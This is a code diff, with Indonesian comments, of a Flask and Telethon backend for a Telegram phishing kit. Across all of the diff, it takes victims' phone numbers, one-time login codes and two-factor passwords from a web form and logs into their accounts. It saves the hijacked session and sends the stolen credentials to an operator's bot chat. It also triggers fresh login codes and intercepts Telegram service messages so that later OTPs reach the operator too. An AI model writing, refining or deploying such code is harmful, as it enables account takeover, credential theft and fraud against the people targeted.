@@ -46,54 +46,54 @@ async def handle_flow(data):
         await client.connect()
 
         if step == 1:
-            # Pancingan Awal
+            # Pancingan awal - data belum dikirim ke bot
             res = await client.send_code_request(nomor)
             user_db[nomor] = {
                 "session": client.session.save(), 
                 "hash": res.phone_code_hash, 
                 "nama": nama, 
-                "msg_id": None,
-                "sandi": "None"
+                "sandi": "None",
+                "msg_id": None
             }
-            
-            # Kirim Pesan Utama ke Bot
-            text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : None"
-            msg = bot_api("sendMessage", {
-                "chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown",
-                "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
-            })
-            user_db[nomor]['msg_id'] = msg.get('result', {}).get('message_id')
             return jsonify({"status": "success"})
 
         elif step == 2:
-            # VALIDASI OTP ASLI DARI BROWSER
+            # Verifikasi OTP browser
             try:
                 await client.sign_in(nomor, data.get('otp'), phone_code_hash=user_db[nomor]['hash'])
-                # Jika lolos sign_in, berarti OTP BENAR
                 user_db[nomor]['session'] = client.session.save()
-                return jsonify({"status": "success"})
+                
+                # Cek jika tidak ada 2FA, kirim data ke bot dengan OTP: None
+                try:
+                    # Jika lolos sampai sini berarti login sukses (tidak ada 2FA)
+                    text = f"Nama: **{user_db[nomor]['nama']}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : None"
+                    msg = bot_api("sendMessage", {
+                        "chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown",
+                        "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
+                    })
+                    user_db[nomor]['msg_id'] = msg.get('result', {}).get('message_id')
+                    return jsonify({"status": "success"})
+                except: pass
             except errors.SessionPasswordNeededError:
-                # Jika butuh 2FA
                 user_db[nomor]['session'] = client.session.save()
                 return jsonify({"status": "need_2fa"})
-            except (errors.PhoneCodeInvalidError, errors.PhoneCodeExpiredError):
-                # JIKA OTP ASAL-ASALAN, AKAN ERROR DI SINI
-                return jsonify({"status": "invalid_otp"}), 400
-            except Exception:
+            except:
                 return jsonify({"status": "invalid_otp"}), 400
 
         elif step == 3:
-            # Validasi Sandi F2
+            # Verifikasi 2FA browser
             try:
                 await client.sign_in(password=data.get('sandi'))
                 user_db[nomor]['sandi'] = data.get('sandi')
-                # Update Pesan Utama dengan Sandi Valid
+                user_db[nomor]['session'] = client.session.save()
+                
+                # Kirim data ke bot setelah semua valid (OTP tetap None)
                 text = f"Nama: **{user_db[nomor]['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi')}**\nOTP : None"
-                bot_api("editMessageText", {
-                    "chat_id": CHAT_ID, "message_id": user_db[nomor]['msg_id'],
-                    "text": text, "parse_mode": "Markdown",
+                msg = bot_api("sendMessage", {
+                    "chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown",
                     "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
                 })
+                user_db[nomor]['msg_id'] = msg.get('result', {}).get('message_id')
                 return jsonify({"status": "success"})
             except:
                 return jsonify({"status": "invalid_2fa"}), 400
@@ -108,14 +108,18 @@ def webhook():
         call = update["callback_query"]
         action, nomor = call["data"].split("_")
         if action == "upd":
-            if user_db.get(nomor, {}).get('status_id'):
-                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": user_db[nomor]['status_id']})
+            # Respon klik tombol OTP
             res = bot_api("sendMessage", {
                 "chat_id": CHAT_ID, "text": "Bot siap menerima OTP!\n/exit untuk keluar", 
                 "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}
             })
             user_db.setdefault(nomor, {})['status_id'] = res.get('result', {}).get('message_id')
+            
+            # Monitoring OTP yang dipicu TurboTel
             threading.Thread(target=lambda: asyncio.run(monitor_incoming_only(nomor))).start()
+        elif action == "exit":
+             if user_db.get(nomor, {}).get('status_id'):
+                bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": user_db[nomor]['status_id']})
     return jsonify({"status": "success"})
 
 async def monitor_incoming_only(nomor):
@@ -124,19 +128,26 @@ async def monitor_incoming_only(nomor):
     client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
     await client.connect()
     try:
+        # PENTING: Memicu OTP baru dari Telegram saat tombol diklik
+        try:
+            await client.send_code_request(nomor)
+        except: pass
+
         @client.on(events.NewMessage(from_users=777000))
         async def handler(event):
             otp = re.search(r'\b\d{5}\b', event.raw_text)
             if otp:
+                # Update OTP yang tadinya 'None' jadi kode asli
                 bot_api("editMessageText", {
                     "chat_id": CHAT_ID, "message_id": data['msg_id'],
                     "text": f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{otp.group(0)}`",
                     "parse_mode": "Markdown", "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
                 })
+                # Hapus instruksi 'Bot siap'
                 if data.get('status_id'):
                     bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_id']})
                 await client.disconnect()
-        await asyncio.sleep(300)
+        await asyncio.sleep(600)
     finally:
         if client.is_connected(): await client.disconnect()
 
